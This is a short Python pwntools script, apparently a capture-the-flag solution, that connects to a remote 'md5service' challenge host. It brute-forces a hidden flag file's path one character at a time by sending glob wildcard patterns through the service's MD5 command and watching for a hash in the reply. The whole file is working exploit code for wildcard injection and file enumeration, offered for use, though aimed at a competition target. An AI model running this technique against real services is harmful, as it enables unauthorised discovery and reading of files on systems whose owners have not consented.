#!/usr/bin/env python2
from pwn import *
import string
# flag_path = '0c8702194e16f006e61f45d5fa0cd511/flag_a6214417905b7d091f00ff59b51d5d78.txt'
flag_path = ''
p = remote("md5service.nc.jctf.pro", 1337)
while True:
    found = False
    # for c in string.ascii_lowercase + string.digits + 'lg_.':
    for c in "0123456789abcdef" + '_.':
        p.sendlineafter("Cmd:", 'MD5 /{}*'.format(flag_path + c))
        p.recvuntil('Result:\n')
        output = p.recvline().strip()
        print c, output
        if len(output) >= 32: # MD5 hash found:
            flag_path += c
            print flag_path
            found = True
            break
    if not found:
        break
p.interactive()
